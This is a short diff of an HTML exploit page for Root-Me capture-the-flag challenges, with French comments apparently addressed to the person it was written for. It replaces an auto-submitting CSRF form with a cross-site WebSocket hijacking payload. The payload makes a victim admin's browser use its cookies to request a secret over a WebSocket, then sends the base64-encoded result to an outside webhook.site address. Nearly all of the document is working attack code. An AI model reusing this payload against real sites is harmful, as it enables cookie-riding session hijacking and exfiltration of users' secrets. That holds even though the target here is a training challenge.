@@ -1,14 +1,26 @@
 <!DOCTYPE html>
 <html>
+<head><title>Pwned</title></head>
 <body>
-    <form action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="POST" enctype="multipart/form-data">
-        <input type="hidden" name="username" value="hacker" />
-        <input type="hidden" name="status" value="on" />
-        <input type="submit" value="Click me if not redirected" />
-    </form>
-
+    <h1>Chargement en cours...</h1>
     <script>
-        document.forms[0].submit();
+        // 1. Connexion au WebSocket du challenge
+        // Le navigateur de l'admin va utiliser ses cookies automatiquement
+        var ws = new WebSocket("ws://ctf23.root-me.org/ws");
+
+        ws.onopen = function() {
+            // 2. On demande le secret
+            ws.send("secret");
+        };
+
+        ws.onmessage = function(event) {
+            // 3. On reçoit le flag
+            var flag = event.data;
+            
+            // 4. On envoie le flag vers ton Webhook
+            // J'ai mis ton URL ici :
+            fetch("https://webhook.site/6a20dbc6-2e8f-4552-858f-600153062740?flag=" + btoa(flag));
+        };
     </script>
 </body>
 </html>
